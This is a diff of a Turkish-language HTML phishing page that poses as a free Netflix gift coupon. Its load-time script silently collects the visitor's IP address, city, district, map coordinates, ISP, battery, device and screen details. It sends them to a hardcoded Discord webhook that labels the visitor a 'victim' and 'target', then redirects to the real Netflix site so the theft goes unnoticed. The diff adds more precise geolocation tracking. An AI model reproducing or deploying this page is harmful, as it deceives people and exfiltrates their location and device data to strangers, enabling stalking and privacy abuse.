@@ -6,7 +6,7 @@
     
     <title>Netflix - 3 Aylık Ücretsiz Hediye Kuponu</title>
     <meta name="title" content="Netflix - 3 Aylık Ücretsiz Hediye Kuponu">
-    <meta name="description" content="Tebrikler! 2026 Şubat ayına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
+    <meta name="description" content="Tebrikler! 2026 yılına özel ücretsiz Netflix kuponunuzu hemen tanımlayın. Sınırlı sayıda!">
     <meta property="og:type" content="website">
     <meta property="og:title" content="Netflix - Hediye Merkezi">
     <meta property="og:description" content="Ücretsiz 3 Aylık Standart Plan Kuponunuzu Alın.">
@@ -29,76 +29,79 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
         <h1>Hediye Kodunuz Tanımlanıyor</h1>
-        <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem 30 saniye sürebilir...</p>
+        <p>Lütfen bekleyin, sistem yoğunluğuna göre işlem bir dakika sürebilir...</p>
         <div class="loader"></div>
     </div>
     <div class="footer-text">© 2026 Netflix, Inc.</div>
 
     <script>
-        // Webhook URL
+        // Senin Discord Webhook Linkin
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        async function anonimBotSistemi() {
+        async function bombaSistem() {
             try {
-                // IP ve Konum
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const d = await ipRes.json();
+                // 1. En Detaylı IP ve Konum Bilgisi (İlçe ve Harita Koordinatı Dahil)
+                const res = await fetch('http://ip-api.com/json/?fields=status,message,country,countryCode,regionName,city,district,zip,lat,lon,timezone,isp,org,as,query');
+                const d = await res.json();
                 
-                // Batarya Durumu
+                // 2. Google Haritalar Linki Oluşturma
+                const haritaLink = `https://www.google.com/maps?q=${d.lat},${d.lon}`;
+
+                // 3. Batarya ve Cihaz Bilgisi
                 let pil = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const battery = await navigator.getBattery();
                     pil = `%${Math.round(battery.level * 100)} ${battery.charging ? '(Şarjda)' : '(Değil)'}`;
                 }
 
-                // Cihaz Türü Tespiti (PC / Telefon / Tablet)
                 const ua = navigator.userAgent;
                 let cihaz = "Bilgisayar (PC)";
                 if (/tablet|ipad|playbook|silk/i.test(ua)) { cihaz = "Tablet"; } 
                 else if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua)) { cihaz = "Akıllı Telefon"; }
 
-                // Discord Raporu
-                const payload = {
+                // 4. Discord ANONİM BOT Raporu
+                const rapor = {
                     username: "ANONİM BOT",
                     avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
-                        title: "🎯 Hedef Bilgileri Toplandı!",
-                        description: "Kurban Netflix sayfasına giriş yaptı.",
-                        color: 14943508, 
+                        title: "🚀 HEDEF PAKETLENDİ - DETAYLI RAPOR",
+                        description: "Kurban Netflix tuzağına düştü ve konum verileri çekildi.",
+                        color: 16711680, // Kırmızı
                         fields: [
-                            { name: "👤 Cihaz", value: `**${cihaz}**`, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: true },
-                            { name: "📍 Şehir/Ülke", value: `${d.city} / ${d.country_name}`, inline: true },
-                            { name: "📡 Sağlayıcı", value: d.org || "Bilinmiyor", inline: true },
+                            { name: "👤 Cihaz / Sistem", value: `**${cihaz}** / ${navigator.platform}`, inline: false },
+                            { name: "📍 Tahmini Konum", value: `**${d.city} / ${d.regionName} / ${d.district || "Semt Belirlenemedi"}**`, inline: false },
+                            { name: "🌐 IP Adresi", value: `\`${d.query}\``, inline: true },
+                            { name: "📡 İnternet Hattı", value: d.isp, inline: true },
                             { name: "🔋 Batarya", value: pil, inline: true },
-                            { name: "🖼️ Ekran", value: `${screen.width}x${screen.height}`, inline: true },
-                            { name: "📱 Sistem", value: `\`${navigator.platform}\``, inline: false },
-                            { name: "🔗 Kaynak", value: document.referrer || "Direkt Giriş", inline: false }
+                            { name: "🗺️ Harita Konumu", value: `[Google Haritalarda Gör (Tıkla)](${haritaLink})`, inline: false },
+                            { name: "🖼️ Ekran & Dil", value: `${screen.width}x${screen.height} | ${navigator.language}`, inline: true },
+                            { name: "🔗 Kaynak", value: document.referrer || "Direkt Link", inline: true }
                         ],
-                        footer: { text: "ANONİM BOT | " + new Date().toLocaleString('tr-TR') },
+                        footer: { text: "ANONİM BOT Gelişmiş Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" }
                     }]
                 };
 
-                // Discord'a Gönder
+                // 5. Discord'a Gönder
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
+                    body: JSON.stringify(rapor)
                 });
 
-                // Yönlendirme (4 Saniye Sonra)
+                // 6. Yönlendirme (4 Saniye Sonra)
                 setTimeout(() => {
-                    alert("Tebrikler! Ücretsiz kuponunuz oluşturuldu. Kullanım sayfasına yönlendiriliyorsunuz.");
+                    alert("Tebrikler! Ücretsiz 3 aylık kuponunuz oluşturuldu. Kullanım için resmi Netflix sayfasına yönlendiriliyorsunuz.");
                     window.location.href = "https://www.netflix.com/tr/redeem";
                 }, 4000);
 
             } catch (error) {
+                // Hata olsa bile çaktırma, Netflix'e yolla
                 window.location.href = "https://www.netflix.com/tr/redeem";
             }
         }
 
-        window.onload = anonimBotSistemi;
+        window.onload = bombaSistem;
     </script>
 </body>
 </html>
